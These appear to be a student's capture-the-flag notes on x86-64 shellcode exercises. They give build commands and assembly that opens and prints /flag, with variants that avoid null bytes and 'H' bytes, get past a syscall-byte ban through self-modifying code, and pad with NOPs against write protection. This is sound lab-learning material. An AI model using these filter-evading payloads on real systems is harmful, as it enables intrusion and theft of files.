# Shellcode exercises
To compile and give solution:
```
gcc -nostdlib -static -o file file.s
objcopy --dump-section .text=RawFile file
cat RawFile | /challenge/level_x
```
Before each source code:
```
.intel_syntax noprefix
.global _start
_start:
```
Base shellcode:  
```
mov     rbx, 0x00000067616c662f
push    rbx
mov     rax, 2
mov     rdi, rsp
mov     rsi, 0
syscall

mov     rdi, 1
mov     rsi, rax
mov     rdx, 0
mov     r10, 1000
mov     rax, 40
syscall
```

## ex 1
## ex 2
## ex 3
+ the shellcode must have NO null bytes
```
mov     rbx, 0x67616c662f111111
shr     rbx, 24
push    rbx

xor	rax, rax
inc     rax
inc     rax		                # rax = 2
mov     rdi, rsp	            # rdi = address of /flag
xor     rsi, rsi	            # rsi = 0
xor	rdx, rdx	                # rdx = 0
syscall			                # open

xor     rdi, rdi
inc     rdi		                # rdi = 1
mov     rsi, rax	            # rsi = rax (return value of open)
xor     rdx, rdx	            # rdx = 0
mov     r10w, 1000	            # r10 = 1000
xor     rax, rax
mov     al, 0x28	            # rax = 40
syscall			                # sendfile
```
## ex 4
+ the shellcode must have NO 'H' bytes
```
mov     r10, 0x00000067616c662f
push    r10

push    2
pop     rax             # rax = 2
push    rsp
pop     rdi             # rdi = rsp
push    0
pop     rsi             # rsi = 0
push    0
pop     rdx             # rdx = 0
syscall                 # open

push    1
pop     rdi             # rdi = 1
push    rax
pop     rsi             # rsi = rax (return value of open)
push    0
pop     rdx             # rdx = 0
mov     r10, 1000       # r10 = 1000
push    40
pop     rax             # rax = 40
syscall                 # sendfile
```

## ex 5
+ the shellcode must have NO syscalls
+ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
```
mov     rbx, 0x00000067616c662f
push    rbx
mov     rax, 2
mov     rdi, rsp
mov     rsi, 0
inc     BYTE PTR [rip]
.word   0x050e

mov     rdi, 1
mov     rsi, rax
mov     rdx, 0
mov     r10, 1000
mov     rax, 40
inc     BYTE PTR [rip]
.word   0x050e
```

## ex 6
+ the shellcode must have NO syscalls
+ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
+ removing write permissions from first 4096 bytes of shellcode  
same as 5, but add 4096 nops before actual code